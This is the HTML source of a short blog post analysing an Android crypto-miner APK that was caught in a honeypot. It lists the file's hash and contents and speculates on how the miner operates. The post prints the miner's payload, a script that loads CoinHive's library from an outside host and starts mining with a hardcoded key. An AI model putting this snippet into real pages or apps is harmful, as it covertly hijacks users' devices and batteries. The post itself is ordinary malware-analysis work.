<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>Fishing for Malware: Android Crypto Miner | Sid's Blog</title>
<meta name=keywords content="sid,lacy,blog,website,cybersecurity,security,computer,honeypot,malware,tech,network">
<meta name=description content="Analysis of malware dropped into my Google Cloud honeypot: pulling apart a rudimentry Android cypto miner">
<meta name=author content="Sid Lacy">
<link rel=canonical href=https://new.swlacy.com/posts/fishing-for-malware-android/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://new.swlacy.com/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://new.swlacy.com/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://new.swlacy.com/favicon-32x32.png>
<link rel=apple-touch-icon href=https://new.swlacy.com/apple-touch-icon.png>
<link rel=mask-icon href=https://new.swlacy.com/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.92.0">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
</noscript><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.2/styles/zenburn.min.css integrity="sha512-JPxjD2t82edI35nXydY/erE9jVPpqxEJ++6nYEoZEpX2TRsmp2FpZuQqZa+wBCen5U16QZOkMadGXHCfp+tUdg==" crossorigin=anonymous referrerpolicy=no-referrer><meta property="og:title" content="Fishing for Malware: Android Crypto Miner">
<meta property="og:description" content="Analysis of malware dropped into my Google Cloud honeypot: pulling apart a rudimentry Android cypto miner">
<meta property="og:type" content="article">
<meta property="og:url" content="https://new.swlacy.com/posts/fishing-for-malware-android/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2022-01-20T00:00:00+00:00">
<meta property="article:modified_time" content="2022-01-20T00:00:00+00:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Fishing for Malware: Android Crypto Miner">
<meta name=twitter:description content="Analysis of malware dropped into my Google Cloud honeypot: pulling apart a rudimentry Android cypto miner">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://new.swlacy.com/posts/"},{"@type":"ListItem","position":3,"name":"Fishing for Malware: Android Crypto Miner","item":"https://new.swlacy.com/posts/fishing-for-malware-android/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Fishing for Malware: Android Crypto Miner","name":"Fishing for Malware: Android Crypto Miner","description":"Analysis of malware dropped into my Google Cloud honeypot: pulling apart a rudimentry Android cypto miner","keywords":["sid","lacy","blog","website","cybersecurity","security","computer","honeypot","malware","tech","network"],"articleBody":"Information:\n SHA-256: 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257 Package name: com.ufo.miner Package type: Java Android APK Size: 45.43 KB  See this file on VirusTotal\nAs the subsection heading and package name imply, this is a crypto miner developed for execution on Android. However, that isn’t particularly interesting on its own, and 45.43 KB is small — suspiciously small — so let’s take a look inside the file. Contents:\n$ unzip 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257.raw.zip Archive: 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257.raw.zip inflating: META-INF/MANIFEST.MF inflating: META-INF/CERT.SF inflating: META-INF/CERT.RSA extracting: res/drawable-xhdpi-v4/ic_launcher.png inflating: AndroidManifest.xml extracting: res/drawable-hdpi-v4/ic_launcher.png inflating: res/layout/activity_main.xml inflating: assets/run.html extracting: resources.arsc extracting: res/drawable-mdpi-v4/ic_launcher.png inflating: classes.dex extracting: res/drawable-xxhdpi-v4/ic_launcher.png inflating: res/menu/main.xml $ I see an HTML file, some PNG images, and some other files, the extensions of which I am not familiar. Let’s check them out.\n$ cat assets/run.html script src=\"https://coinhive.com/lib/coinhive.min.js\"script script var miner = new CoinHive.Anonymous('fwW95bBFO91OKUsz1VhlMEQwxmDBz7XE',{ threads:4, throttle: 0.8 }); miner.start(); script Sigh. It remains boring. However, by searching for the crypto wallet hardcoded into the HTML, I came across a presentation from Fortinet, indicating that this CoinHive-related malware may have been a part of the Trinity Android P2P malware bot, which is quite interesting. Alas, that is a rabbit hole for another blog post.\nEach PNG was a rescaled version of the stock Android logo — not much to say beyond that.\nHow I assume this malware works:\n  The victim’s stock web browser embeds into an app frame in the background.\n  Instructions are received from CoinHive.\n  The miner starts working, sending proof of work to the address hardcoded into the script.\n  The victim’s phone gets too hot, or the battery drains too fast; upon seeing the culprit as com.ufo.miner in the power report of the device, the victim promptly uninstalls the application.\n   Sid Lacy\nEmail • LinkedIn • GitHub\n","wordCount":"284","inLanguage":"en","datePublished":"2022-01-20T00:00:00Z","dateModified":"2022-01-20T00:00:00Z","author":[{"@type":"Person","name":"Sid Lacy"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://new.swlacy.com/posts/fishing-for-malware-android/"},"publisher":{"@type":"Organization","name":"Sid's Blog","logo":{"@type":"ImageObject","url":"https://new.swlacy.com/favicon.ico"}}}</script>
</head>
<body class=dark id=top>
<script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://new.swlacy.com accesskey=h title="Sid's Blog (Alt + H)">Sid's Blog</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://new.swlacy.com/ title=Home>
<span>Home</span>
</a>
</li>
<li>
<a href=https://new.swlacy.com/documents title=Documents>
<span>Documents</span>
</a>
</li>
<li>
<a href=https://new.swlacy.com/posts title=Posts>
<span>Posts</span>
</a>
</li>
<li>
<a href=https://new.swlacy.com/resume.pdf title=Resume>
<span>Resume</span>
</a>
</li>
<li>
<a href=https://new.swlacy.com/about title=About>
<span>About</span>
</a>
</li>
<li>
<a href=https://new.swlacy.com/archive title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://new.swlacy.com/search title="Search (Alt + /)" accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://new.swlacy.com>Home</a>&nbsp;»&nbsp;<a href=https://new.swlacy.com/posts/>Posts</a></div>
<h1 class=post-title>
Fishing for Malware: Android Crypto Miner
</h1>
<div class=post-description>
Analysis of malware dropped into my Google Cloud honeypot: pulling apart a rudimentry Android cypto miner
</div>
<div class=post-meta><span title="2022-01-20 00:00:00 +0000 UTC">January 20, 2022</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Sid Lacy
</div>
</header>
<div class=post-content><p>Information:</p>
<ul>
<li>SHA-256: <code>0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257</code></li>
<li>Package name: <code>com.ufo.miner</code></li>
<li>Package type: Java Android APK</li>
<li>Size: 45.43 KB</li>
</ul>
<p><a href=https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257/detection><em>See this file on VirusTotal</em></a></p>
<p>As the subsection heading and package name imply, this is a crypto miner developed for execution on Android. However, that isn&rsquo;t particularly interesting on its own, and 45.43 KB is small — suspiciously small — so let&rsquo;s take a look inside the file. Contents:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ unzip 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257.raw.zip 
Archive:  0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257.raw.zip
  inflating: META-INF/MANIFEST.MF    
  inflating: META-INF/CERT.SF        
  inflating: META-INF/CERT.RSA       
 extracting: res/drawable-xhdpi-v4/ic_launcher.png  
  inflating: AndroidManifest.xml     
 extracting: res/drawable-hdpi-v4/ic_launcher.png  
  inflating: res/layout/activity_main.xml  
  inflating: assets/run.html         
 extracting: resources.arsc          
 extracting: res/drawable-mdpi-v4/ic_launcher.png  
  inflating: classes.dex             
 extracting: res/drawable-xxhdpi-v4/ic_launcher.png  
  inflating: res/menu/main.xml     
  
$
</code></pre></div><p>I see an HTML file, some PNG images, and some other files, the extensions of which I am not familiar. Let&rsquo;s check them out.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ cat assets/run.html
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;https://coinhive.com/lib/coinhive.min.js&#34;</span>&gt;&lt;/<span style=color:#f92672>script</span>&gt;
&lt;<span style=color:#f92672>script</span>&gt;
    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>miner</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>CoinHive</span>.<span style=color:#a6e22e>Anonymous</span>(<span style=color:#e6db74>&#39;fwW95bBFO91OKUsz1VhlMEQwxmDBz7XE&#39;</span>,{
        <span style=color:#a6e22e>threads</span><span style=color:#f92672>:</span><span style=color:#ae81ff>4</span>,
        <span style=color:#a6e22e>throttle</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>0.8</span>
});
    <span style=color:#a6e22e>miner</span>.<span style=color:#a6e22e>start</span>();
&lt;/<span style=color:#f92672>script</span>&gt;
</code></pre></div><p>Sigh. It remains boring. <em>However,</em> by searching for the crypto wallet hardcoded into the HTML, I came across a presentation from <a href=https://www.blackalps.ch/ba-18/files/talks/BlackAlps18-Axelle_Apvrille.pdf>Fortinet</a>, indicating that this CoinHive-related malware may have been a part of the <a href=https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2020/11/22/trinity_p2p_malware-8S4I.html>Trinity Android P2P malware bot</a>, which <em>is</em> quite interesting. Alas, that is a rabbit hole for another blog post.</p>
<p>Each PNG was a rescaled version of the stock Android logo — not much to say beyond that.</p>
<p>How I assume this malware works:</p>
<ol>
<li>
<p>The victim&rsquo;s stock web browser embeds into an app frame in the background.</p>
</li>
<li>
<p>Instructions are received from CoinHive.</p>
</li>
<li>
<p>The miner starts working, sending proof of work to the address hardcoded into the script.</p>
</li>
<li>
<p>The victim&rsquo;s phone gets too hot, or the battery drains too fast; upon seeing the culprit as <em>com.ufo.miner</em> in the power report of the device, the victim promptly uninstalls the application.</p>
</li>
</ol>
<hr>
<p>Sid Lacy<br>
<a href="mailto:contact@swlacy.com?subject=Hello!">Email</a> • <a href=https://www.linkedin.com/in/lacysw/>LinkedIn</a> • <a href=https://github.com/lacysw>GitHub</a></p>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://new.swlacy.com/tags/analysis/>analysis</a></li>
<li><a href=https://new.swlacy.com/tags/projects/>projects</a></li>
</ul>
</footer>
</article>
</main>
<footer class=footer>
<span>Copyright &copy; 2022 Sid Lacy • Last Built 22.01.20 UTC</a></span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script src=https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin=anonymous referrerpolicy=no-referrer></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(a=>{mediumZoom(a,{background:'#000'})})</script>
<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>